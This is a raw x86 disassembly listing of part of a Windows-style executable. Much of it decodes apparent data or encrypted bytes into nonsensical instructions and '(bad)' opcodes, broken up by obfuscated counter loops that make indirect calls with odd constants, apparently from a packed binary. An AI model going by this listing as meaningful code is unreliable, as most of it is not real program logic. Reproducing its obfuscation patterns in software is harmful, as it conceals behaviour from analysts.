  40a193:	mov    esi,0x33c911c2
  40a198:	push   esi
  40a199:	jne    0x40a1fb
  40a19b:	jl     0x40a1ea
  40a19d:	jl     0x40a15b
  40a19f:	cmp    edi,edx
  40a1a1:	mov    eax,ds:0xaf63e7c1
  40a1a6:	push   eax
  40a1a7:	mov    al,ds:0xa3a57d20
  40a1ac:	pop    eax
  40a1ad:	inc    edx
  40a1ae:	out    dx,eax
  40a1af:	pop    ds
  40a1b0:	cmp    ebp,DWORD PTR [ebx+0x3f43198d]
  40a1b6:	add    al,0xc7
  40a1b8:	lds    ebp,FWORD PTR [eax]
  40a1ba:	and    bh,BYTE PTR [edi-0x60]
  40a1bd:	jp     0x40a1b8
  40a1bf:	mov    al,ds:0x6d2ef15f
  40a1c4:	pusha  
  40a1c5:	sbb    BYTE PTR [ecx-0x1],bl
  40a1c8:	jb     0x40a21b
  40a1ca:	test   DWORD PTR [edx+0x604cb100],esi
  40a1d0:	daa    
  40a1d1:	repnz adc ebp,DWORD PTR [edi-0x2c]
  40a1d5:	adc    eax,0x230ead63
  40a1da:	xchg   esi,eax
  40a1db:	jge    0x40a240
  40a1dd:	nop
  40a1de:	popa   
  40a1df:	mov    bl,BYTE PTR [eax]
  40a1e1:	int    0xb3
  40a1e3:	outs   dx,BYTE PTR ds:[esi]
  40a1e4:	ja     0x40a1cb
  40a1e6:	rcl    bl,cl
  40a1e8:	pop    eax
  40a1e9:	shr    DWORD PTR [ecx+0x2],0x84
  40a1ed:	shr    BYTE PTR [esi+eax*2],0x22
  40a1f1:	sbb    BYTE PTR [eax+0x1],al
  40a1f4:	aaa    
  40a1f5:	cli    
  40a1f6:	cs inc ebp
  40a1f8:	adc    al,0xa2
  40a1fa:	dec    ebx
  40a1fb:	xchg   ecx,eax
  40a1fc:	pop    ebx
  40a1fd:	scas   eax,DWORD PTR es:[edi]
  40a1fe:	adc    al,0xee
  40a200:	mov    esi,0xd57ba8ba
  40a205:	(bad)  
  40a207:	inc    esi
  40a208:	xchg   ah,dl
  40a20a:	pop    edi
  40a20b:	fs jle 0x40a265
  40a20e:	(bad)  
  40a20f:	jp     0x40a278
  40a211:	test   eax,0xebf85eec
  40a216:	mov    bl,0x3b
  40a218:	fistp  DWORD PTR [ebp-0x341152ae]
  40a21e:	outs   dx,BYTE PTR ds:[esi]
  40a21f:	fild   DWORD PTR [edi+ebx*2+0x28]
  40a223:	dec    ebp
  40a224:	mov    esp,0xd26e8a16
  40a229:	mov    ecx,0xed1e7134
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fced,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	in     al,0x8
  40a2c6:	stos   DWORD PTR es:[edi],eax
  40a2c7:	mov    edx,0x7070f545
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a330
  40a2d1:	mov    gs,WORD PTR [eax+0x56771bfb]
  40a2d7:	and    bl,0x3a
  40a2da:	cmp    DWORD PTR [ebx-0x255de591],edi
  40a2e0:	mov    ?,WORD PTR [edx-0x7021f7a9]
  40a2e6:	sub    DWORD PTR [ecx-0x74f26bae],0x6d
  40a2ed:	push   es
  40a2ee:	mov    BYTE PTR [eax-0x76],ah
  40a2f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2f2:	je     0x40a316
  40a2f4:	aam    0xf1
  40a2f6:	(bad)  
  40a2f7:	clc    
  40a2f8:	mov    edi,DWORD PTR [eax+0x3f49a69a]
  40a2fe:	aam    0x45
  40a300:	(bad)  
  40a301:	sbb    al,0x8f
  40a303:	add    DWORD PTR [edx+ebx*1+0x46],ecx
  40a307:	and    eax,0xf17673b
  40a30c:	add    BYTE PTR [ecx],bh
  40a30e:	imul   ebp,ebx,0xffffff9c
  40a311:	clc    
  40a312:	test   cl,bh
  40a314:	out    dx,eax
  40a315:	stos   DWORD PTR es:[edi],eax
  40a316:	popa   
  40a317:	sub    al,0xcc
  40a319:	lods   eax,DWORD PTR ds:[esi]
  40a31a:	xor    ebx,esi
  40a31c:	out    dx,al
  40a31d:	add    ah,0xb0
  40a320:	lods   al,BYTE PTR ds:[esi]
  40a321:	jnp    0x40a2d1
  40a323:	or     al,0x4a
  40a325:	dec    ebp
  40a326:	mov    ecx,0xa686560d
  40a32b:	sub    edx,DWORD PTR [ecx-0x27353db9]
  40a331:	or     bh,cl
  40a333:	mov    esi,0xb9a8f8f6
  40a338:	mov    edi,0xc565a1af
  40a33d:	xor    al,0x36
  40a33f:	mov    cl,0x25
  40a341:	mov    ecx,0x404bb609
  40a346:	xchg   BYTE PTR [ecx-0xf],ah
  40a349:	mov    esp,0xfb43832b
  40a34e:	mov    bh,BYTE PTR [ebp+0x41]
  40a351:	mov    edx,0x11de6e0
  40a356:	ss dec ebp
  40a358:	mov    ah,ch
  40a35a:	push   ecx
  40a35b:	test   dh,al
  40a35d:	jl     0x40a366
  40a35f:	repnz dec edi
  40a361:	ret    
  40a362:	out    dx,eax
  40a363:	shl    BYTE PTR [esi+0x6591f4ea],cl
  40a369:	pop    esi
  40a36a:	mov    ecx,0xe0964236
  40a36f:	jl     0x40a393
  40a371:	xor    esp,eax
  40a373:	repnz mov ah,0xf6
  40a376:	adc    eax,0xafe84531
  40a37b:	sbb    BYTE PTR [esp+ebx*8+0x7eb54bd4],dl
  40a382:	call   0xac3a5359
  40a387:	fcom   QWORD PTR [ebp+0x1404b362]
  40a38d:	push   ss
  40a38e:	add    eax,0xc9a82cd7
  40a393:	sti    
  40a394:	fwait
  40a395:	cmp    eax,0x6c4dd654
  40a39a:	mov    bh,0x22
  40a39c:	xchg   edi,eax
  40a39d:	in     al,0xce
  40a39f:	test   DWORD PTR [ebx],edx
  40a3a1:	adc    al,0x3e
  40a3a3:	sbb    eax,DWORD PTR ds:0x8d586f0b
  40a3a9:	inc    edi
  40a3aa:	popa   
  40a3ab:	stos   BYTE PTR es:[edi],al
  40a3ac:	inc    edi
  40a3ad:	mov    esi,0x85bf1739
  40a3b2:	inc    esp
  40a3b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3b4:	fistp  DWORD PTR [esi+ecx*1-0x53bbae27]
  40a3bb:	neg    DWORD PTR [eax-0x46cc733]
  40a3c1:	dec    edi
  40a3c2:	jne    0x40a41f
  40a3c4:	hlt    
  40a3c5:	and    dh,bl
  40a3c7:	push   ebp
  40a3c8:	shl    DWORD PTR [esp+eiz*2-0x6],0xf8
  40a3cd:	scas   eax,DWORD PTR es:[edi]
  40a3ce:	xor    eax,0xc275dbb9
  40a3d3:	lock shr DWORD PTR [edx-0x5b],1
  40a3d7:	pop    ss
  40a3d8:	rcl    DWORD PTR [ebp+ebx*8-0x7b],1
  40a3dc:	sar    DWORD PTR [edx],cl
  40a3de:	imul   al
  40a3e0:	mov    DWORD PTR [ebp-0x34],ecx
  40a3e3:	leave  
  40a3e4:	mov    al,0x80
  40a3e6:	mov    BYTE PTR [ecx],bh
  40a3e8:	push   ss
  40a3e9:	mov    bl,0xe0
  40a3eb:	cdq    
  40a3ec:	dec    ebp
  40a3ed:	ror    BYTE PTR [ecx-0x12],1
  40a3f0:	test   DWORD PTR [ebx-0x6a],0xe1f00c64
  40a3f7:	adc    bh,bl
  40a3f9:	sub    ah,BYTE PTR ds:0x2aab2d89
  40a3ff:	nop
  40a400:	add    BYTE PTR [ebp+0x22],al
  40a403:	sar    BYTE PTR [edx+edi*2],1
  40a406:	lods   al,BYTE PTR ds:[esi]
  40a407:	mov    al,ds:0xbe32c65b
  40a40c:	dec    ecx
  40a40d:	stc    
  40a40e:	out    0x40,al
  40a410:	dec    bp
  40a412:	dec    ebx
  40a413:	fmul   st(7),st
  40a415:	or     DWORD PTR [ebx+0x630c2dfb],esi
  40a41b:	xor    eax,0xca779d53
  40a420:	rcr    DWORD PTR [ecx],cl
  40a422:	mov    ch,0xbb
  40a424:	sti    
  40a425:	stos   DWORD PTR es:[edi],eax
  40a426:	sub    eax,0x15ad8829
  40a42b:	dec    esi
  40a42c:	aam    0xf7
  40a42e:	push   ecx
  40a42f:	into   
  40a430:	xor    ax,0xcf9a
  40a434:	test   al,0x73
  40a436:	ss inc ecx
  40a438:	icebp  
  40a439:	out    0x2d,eax
  40a43b:	cmp    dh,bh
  40a43d:	mov    edx,0x4f5df6a3
  40a442:	pop    gs
  40a444:	sbb    ch,BYTE PTR [edi+0x68]
  40a447:	dec    ecx
  40a448:	retf   0x1f20
  40a44b:	sbb    BYTE PTR [eax],0xa4
  40a44e:	pop    ss
  40a44f:	or     ah,bl
  40a451:	aaa    
  40a452:	test   BYTE PTR [ebx-0x2e],dh
  40a455:	pop    ds
  40a456:	adc    bl,al
  40a458:	cli    
  40a459:	mov    edx,0x4e37418f
  40a45e:	inc    edx
  40a45f:	mov    esp,DWORD PTR [ebx-0x21]
  40a462:	sbb    DWORD PTR [edi+0x3b51d16d],ebx
  40a468:	jb     0x40a44a
  40a46a:	jp     0x40a4d3
  40a46c:	push   ecx
  40a46d:	mov    ds:0x53bd533f,al
  40a472:	ret    0xb52c
  40a475:	fsubr  st(0),st
  40a477:	in     eax,dx
  40a478:	push   ds
  40a479:	shl    BYTE PTR ds:0xb54d2c2c,0xc7
  40a480:	icebp  
  40a481:	lods   eax,DWORD PTR ds:[esi]
  40a482:	adc    ebx,DWORD PTR [edi]
  40a484:	xor    esp,DWORD PTR [esi+0x46f5c8c2]
  40a48a:	push   0xffffffb9
  40a48c:	pop    ebx
  40a48d:	call   0xdafc:0xaea535ee
  40a494:	test   al,0x2b
  40a496:	in     eax,dx
  40a497:	shl    BYTE PTR [ebx],1
  40a499:	sahf   
  40a49a:	dec    edx
  40a49b:	mov    ?,WORD PTR [ecx+eiz*8]
  40a49e:	mov    ebp,0x7381d2a5
  40a4a3:	mov    ah,0xe8
  40a4a5:	push   ecx
  40a4a6:	jae    0x40a511
  40a4a8:	inc    edx
  40a4a9:	sbb    DWORD PTR [ebp-0x41eb38f4],0xf5ca6c9e
  40a4b3:	pop    es
  40a4b4:	jne    0x40a465
  40a4b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4b7:	add    al,0x6a
  40a4b9:	je     0x40a4f5
  40a4bb:	and    BYTE PTR [ebp-0x78],ah
  40a4be:	shl    BYTE PTR [ebx],0xb3
  40a4c1:	mov    ds:0x85db09f8,eax
  40a4c6:	inc    ebp
  40a4c7:	ja     0x40a479
  40a4c9:	in     eax,0xe
  40a4cb:	leave  
  40a4cc:	cmp    dl,BYTE PTR [ebp+0x3bbfc8c]
  40a4d2:	jb     0x40a4fa
  40a4d4:	dec    ebx
  40a4d5:	push   ebx
  40a4d6:	clc    
  40a4d7:	(bad)  
  40a4d9:	jg     0x40a495
  40a4db:	ds aaa 
  40a4dd:	jae    0x40a51f
  40a4df:	stc    
  40a4e0:	jbe    0x40a4bb
  40a4e2:	ret    
  40a4e3:	fadd   DWORD PTR [edx+edi*4-0x7d]
  40a4e7:	cmp    al,0xf5
  40a4e9:	in     eax,0x52
  40a4eb:	pop    ebx
  40a4ec:	call   FWORD PTR [edx-0x19908c3f]
  40a4f2:	daa    
  40a4f3:	jmp    0x40a48f
  40a4f5:	inc    eax
  40a4f6:	and    eax,0x5a46d46c
  40a4fb:	int3   
  40a4fc:	repz cmp edi,DWORD PTR fs:[ecx+0x48eb7a52]
  40a504:	in     al,dx
  40a505:	inc    ebp
  40a506:	push   cs
  40a507:	xchg   BYTE PTR [ebx+0x4f],cl
  40a50a:	shl    DWORD PTR [esi],1
  40a50c:	fmul   DWORD PTR [ebx]
  40a50e:	fstp   st(7)
  40a510:	jl     0x40a564
  40a512:	aaa    
  40a513:	push   edx
  40a514:	and    al,0x3a
  40a516:	adc    DWORD PTR [edx-0x7c],esp
  40a519:	je     0x40a55c
  40a51b:	test   al,0x2b
  40a51d:	or     BYTE PTR [esi-0x32de4696],dl
  40a523:	test   eax,0xa83f19ba
  40a528:	push   esi
  40a529:	xchg   esi,eax
  40a52a:	sub    eax,0x8db1e8c4
  40a52f:	cmp    eax,0xc376ad15
  40a534:	jo     0x40a535
  40a536:	xchg   esp,eax
  40a537:	mov    dl,0xed
  40a539:	(bad)  
  40a53a:	dec    ebp
  40a53b:	sub    esp,DWORD PTR ss:[edx+0xe307d20]
  40a542:	sar    esp,0x20
  40a545:	in     eax,dx
  40a546:	pop    esp
  40a547:	and    cl,BYTE PTR [ebx]
  40a549:	cmp    cl,BYTE PTR [edi+0x76]
  40a54c:	push   eax
  40a54d:	sub    al,0x5d
  40a54f:	push   ecx
  40a550:	xlat   BYTE PTR ds:[ebx]
  40a551:	mov    ds:0x95582cf2,eax
  40a556:	add    DWORD PTR [ecx+edi*1+0x12c87151],esp
  40a55d:	xor    al,0x38
  40a55f:	lods   eax,DWORD PTR ds:[esi]
  40a560:	out    0x27,al
  40a562:	pop    eax
  40a563:	imul   esi,DWORD PTR [ecx+edx*8],0xcb9cfb41
  40a56a:	int3   
  40a56b:	push   esp
  40a56c:	pop    es
  40a56d:	je     0x40a5e0
  40a56f:	stc    
  40a570:	push   eax
  40a571:	mov    DWORD PTR [edx-0x38],ecx
  40a574:	test   DWORD PTR [ecx],0x7da7cd35
  40a57a:	jmp    0x97a219e5
  40a57f:	push   ds
  40a580:	scas   eax,DWORD PTR es:[edi]
  40a581:	outs   dx,DWORD PTR ds:[esi]
  40a582:	ins    DWORD PTR es:[edi],dx
  40a583:	in     eax,0xf0
  40a585:	mov    bl,0x22
  40a587:	call   0xf079:0xd776bb27
  40a58e:	xor    eax,0xd0e192a9
  40a593:	aam    0xde
  40a595:	inc    edi
  40a596:	push   0x334ba210
  40a59b:	xchg   ebx,eax
  40a59c:	add    al,0x53
  40a59e:	pop    ecx
  40a59f:	jae    0x40a618
  40a5a1:	mov    bh,0xb5
  40a5a3:	pop    es
  40a5a4:	jb     0x40a52b
  40a5a6:	push   0x21
  40a5a8:	test   BYTE PTR [esi-0x3],dh
  40a5ab:	not    DWORD PTR [ebx]
  40a5ad:	test   BYTE PTR [esi+edi*1],bl
  40a5b0:	jns    0x40a532
  40a5b2:	sar    al,1
  40a5b4:	je     0x40a629
  40a5b6:	sbb    al,0xc0
  40a5b8:	(bad)  [ecx+ebp*2]
  40a5bb:	jno    0x40a56f
  40a5bd:	add    dl,BYTE PTR [ebx]
  40a5bf:	push   0x275372
  40a5c4:	cmp    edi,DWORD PTR [eax+ecx*8+0x30]
  40a5c8:	mov    eax,ds:0x8d6dbd34
  40a5cd:	std    
  40a5ce:	fsub   QWORD PTR [ebx+0x35]
  40a5d1:	jp     0x40a5fa
  40a5d3:	lods   al,BYTE PTR ds:[esi]
  40a5d4:	sbb    DWORD PTR [edi-0x2cd81900],0xc79b6dec
  40a5de:	arpl   WORD PTR [ecx-0x662092c5],si
  40a5e4:	pushf  
  40a5e5:	mov    ah,0x5d
  40a5e7:	sub    dh,BYTE PTR [ebp-0x14470615]
  40a5ed:	pop    ecx
  40a5ee:	(bad)  
  40a5ef:	in     al,0xe
  40a5f1:	or     cl,BYTE PTR [edx]
  40a5f3:	dec    edi
  40a5f4:	sbb    ebx,DWORD PTR [ebx]
  40a5f6:	mov    bh,0x26
  40a5f8:	test   eax,0xcc7ffdc8
  40a5fd:	xchg   ebx,eax
  40a5fe:	push   esp
  40a5ff:	call   DWORD PTR [ebx-0x3d21d254]
  40a605:	jge    0x40a652
  40a607:	hlt    
  40a608:	push   ecx
  40a609:	mov    eax,0x9604eb54
  40a60e:	repz and DWORD PTR [esi-0x67],ecx
  40a612:	inc    edx
  40a613:	cmp    al,0xce
  40a615:	xchg   ebp,eax
  40a616:	loope  0x40a617
  40a618:	xchg   edi,eax
  40a619:	and    eax,0x225142aa
  40a61e:	mov    edi,0x5b0c9a24
  40a623:	test   edi,ebx
  40a625:	test   eax,0x47360a29
  40a62a:	sub    esp,DWORD PTR [esi-0x7]
  40a62d:	dec    ecx
  40a62e:	or     al,BYTE PTR [edx-0x4f8ce5ed]
  40a634:	cs mov ebp,0x30dd89f1
  40a63a:	adc    DWORD PTR [eax+0x5a1b6527],edi
  40a640:	add    cl,BYTE PTR [eax+edi*2+0x6b1a236d]
  40a647:	aaa    
  40a648:	(bad)  
  40a649:	lods   al,BYTE PTR ds:[esi]
  40a64a:	jb     0x40a677
  40a64c:	pop    esp
  40a64d:	mov    ecx,0x3be7ddc
  40a652:	(bad)  
  40a653:	(bad)  
  40a654:	outs   dx,DWORD PTR ds:[esi]
  40a655:	outs   dx,BYTE PTR gs:[esi]
  40a657:	push   0x60
  40a659:	call   0xc961c947
  40a65e:	in     eax,0x69
  40a660:	pop    ecx
  40a661:	mov    cl,0x28
  40a663:	(bad)  
  40a664:	push   ecx
  40a665:	sub    BYTE PTR [ecx+0x74],al
  40a668:	mov    ch,0x2a
  40a66a:	mov    al,BYTE PTR [ecx]
  40a66c:	push   ss
  40a66d:	pop    eax
  40a66e:	add    eax,0x45c77ff7
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	into   
  40a854:	xchg   ebp,eax
  40a855:	add    ecx,edi
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a832
  40a860:	les    ebx,FWORD PTR [edx+0x3a9be599]
  40a866:	call   0x44dc6989
  40a86b:	je     0x40a81f
  40a86d:	cmp    ecx,ecx
  40a86f:	pop    es
  40a870:	data16 loopne 0x40a8c4
  40a873:	mov    ebp,fs
  40a875:	inc    eax
  40a876:	rcr    BYTE PTR [ecx-0x77353a63],cl
  40a87c:	ror    BYTE PTR [ecx-0x3f2894c2],cl
  40a882:	fsub   QWORD PTR [edx-0x48]
  40a885:	fmul   DWORD PTR [eax]
  40a887:	jecxz  0x40a8c7
  40a889:	inc    ebp
  40a88a:	gs ret 
  40a88c:	adc    edx,edi
  40a88e:	and    eax,0x4ccd855b
  40a893:	enter  0xc89f,0xd7
  40a897:	cmp    eax,0x2d943b90
  40a89c:	push   esi
  40a89d:	or     DWORD PTR [edx-0x7316eb7b],esi
  40a8a3:	sub    BYTE PTR [edx],ch
  40a8a5:	cmp    DWORD PTR [ebx],0x39
  40a8a8:	out    0xf9,al
  40a8aa:	xor    ebx,DWORD PTR [ebx-0x2619631]
  40a8b0:	neg    BYTE PTR [esi+0x26501e6e]
  40a8b6:	call   DWORD PTR [ecx-0x4e]
  40a8b9:	xchg   esi,eax
  40a8ba:	jbe    0x40a86c
  40a8bc:	call   0x65b6:0x7075ffef
  40a8c3:	sub    BYTE PTR [ebx-0x384f8251],0xad
  40a8ca:	imul   ecx,DWORD PTR ds:0x9db92bdb,0xa4cd6dee
  40a8d4:	hlt    
  40a8d5:	inc    edi
  40a8d6:	jnp    0x40a915
  40a8d8:	xor    dh,dh
  40a8da:	ffree  st(1)
  40a8dc:	shl    DWORD PTR [edi+0x6ccb6cb8],1
  40a8e2:	outs   dx,DWORD PTR ds:[esi]
  40a8e3:	inc    esi
  40a8e4:	adc    ebx,esi
  40a8e6:	test   BYTE PTR [esi+0x92f20e6],cl
  40a8ec:	jle    0x40a884
  40a8ee:	jbe    0x40a913
  40a8f0:	sti    
  40a8f1:	add    al,0x19
  40a8f3:	(bad)  
  40a8f4:	push   0xe083d009
  40a8f9:	call   0x75b4:0x9371b112
  40a900:	and    ah,ah
  40a902:	outs   dx,DWORD PTR ds:[esi]
  40a903:	scas   eax,DWORD PTR es:[edi]
  40a904:	call   0xa08c625
  40a909:	and    BYTE PTR [eax+0x4b],bl
  40a90c:	pop    edi
  40a90d:	cmc    
  40a90e:	cmp    eax,0x2145364
  40a913:	xchg   ebx,eax
  40a914:	inc    eax
  40a915:	push   ss
  40a916:	lahf   
  40a917:	mov    al,0x24
  40a919:	jecxz  0x40a911
  40a91b:	push   ecx
  40a91c:	mov    ?,WORD PTR [esp+ecx*1+0x115d9003]
  40a923:	or     eax,0xcd8375f7
  40a928:	xor    DWORD PTR [ebx],0x50d80ce6
  40a92e:	inc    esp
  40a92f:	aaa    
  40a930:	lods   eax,DWORD PTR ds:[esi]
  40a931:	out    dx,al
  40a932:	jnp    0x40a912
  40a934:	stc    
  40a935:	inc    bh
  40a937:	in     al,0x4d
  40a939:	mov    esi,0x5d59ec1f
  40a93e:	pop    ebx
  40a93f:	in     al,dx
  40a940:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a941:	ror    DWORD PTR [ecx-0x66],1
  40a944:	inc    esi
  40a945:	pop    ebp
  40a946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a947:	dec    esp
  40a948:	push   esi
  40a949:	addr16 mov cl,0x4e
  40a94c:	fcom   QWORD PTR [edx-0x33]
  40a94f:	cmp    ebx,ebx
  40a951:	aam    0xc6
  40a953:	sbb    BYTE PTR [edi+0x5309b96e],0xd6
  40a95a:	arpl   WORD PTR [esi+0x10],si
  40a95d:	and    edi,esi
  40a95f:	adc    eax,0x5433dfc5
  40a964:	div    bl
  40a966:	scas   eax,DWORD PTR es:[edi]
  40a967:	mov    edi,0xfd314f8f
  40a96c:	mov    al,ds:0x94e949c0
  40a971:	mov    esp,DWORD PTR [edi-0x5345c181]
  40a977:	(bad)  
  40a979:	(bad)  
  40a97a:	dec    esi
  40a97b:	pandn  mm1,QWORD PTR [ebx+0x29fc3115]
  40a982:	adc    eax,0xa470a012
  40a987:	fs nop
  40a989:	sub    dl,BYTE PTR [edi-0x3f]
  40a98c:	lods   eax,DWORD PTR ds:[esi]
  40a98d:	jae    0x40a967
  40a98f:	mov    edx,0x8c501fea
  40a994:	push   edx
  40a995:	or     BYTE PTR [esi+0x3228b0a0],dl
  40a99b:	loopne 0x40aa15
  40a99d:	push   ebx
  40a99e:	add    DWORD PTR [eax],ecx
  40a9a0:	arpl   WORD PTR [ebx],bx
  40a9a2:	or     ebp,ebp
  40a9a4:	sbb    ebx,edi
  40a9a6:	repnz push ebp
  40a9a8:	jnp    0x40a936
  40a9aa:	and    BYTE PTR [esi+0x473aa251],bl
  40a9b0:	inc    edx
  40a9b1:	sar    dh,1
  40a9b3:	out    0xb3,al
  40a9b5:	retf   0xdd27
  40a9b8:	lea    esp,[esi+ecx*8-0x7549d3c]
  40a9bf:	inc    edi
  40a9c0:	xlat   BYTE PTR ds:[ebx]
  40a9c1:	enter  0x17db,0xbe
  40a9c5:	repz sbb eax,0x4f2bac8a
  40a9cb:	loopne 0x40a9f2
  40a9cd:	pop    es
  40a9ce:	in     al,dx
  40a9cf:	iret   
  40a9d0:	daa    
  40a9d1:	cmp    eax,0x79d36599
  40a9d6:	jo     0x40aa38
  40a9d8:	hlt    
  40a9d9:	std    
  40a9da:	push   edx
  40a9db:	jno    0x40a960
  40a9dd:	(bad)  
  40a9de:	jb     0x40a9bb
  40a9e0:	sar    BYTE PTR [edi],cl
  40a9e2:	and    eax,0x7a573c57
  40a9e7:	sahf   
  40a9e8:	inc    eax
  40a9e9:	mov    ds:0xe827fb71,eax
  40a9ee:	mov    ebp,gs
  40a9f0:	sbb    DWORD PTR [edx],edi
  40a9f2:	mul    DWORD PTR [ecx-0x24]
  40a9f5:	(bad)  
  40a9f6:	mov    ch,0xaf
  40a9f8:	popf   
  40a9f9:	mov    ebx,0x4452fa32
  40a9fe:	adc    bl,BYTE PTR [edx-0x6fc6aa6f]
  40aa04:	mov    al,0x6a
  40aa06:	inc    esp
  40aa07:	mov    bl,0xf6
  40aa09:	dec    ecx
  40aa0a:	jns    0x40a9ca
  40aa0c:	retf   
  40aa0d:	xor    edx,edx
  40aa0f:	jb     0x40a99a
  40aa11:	arpl   bx,ax
  40aa13:	sub    al,0x83
  40aa15:	pop    esi
  40aa16:	ins    DWORD PTR es:[edi],dx
  40aa17:	loop   0x40aa4e
  40aa19:	popf   
  40aa1a:	xchg   ebp,eax
  40aa1b:	inc    esi
  40aa1c:	loope  0x40a9a5
  40aa1e:	sbb    al,0x41
  40aa20:	lahf   
  40aa21:	out    dx,al
  40aa22:	push   cs
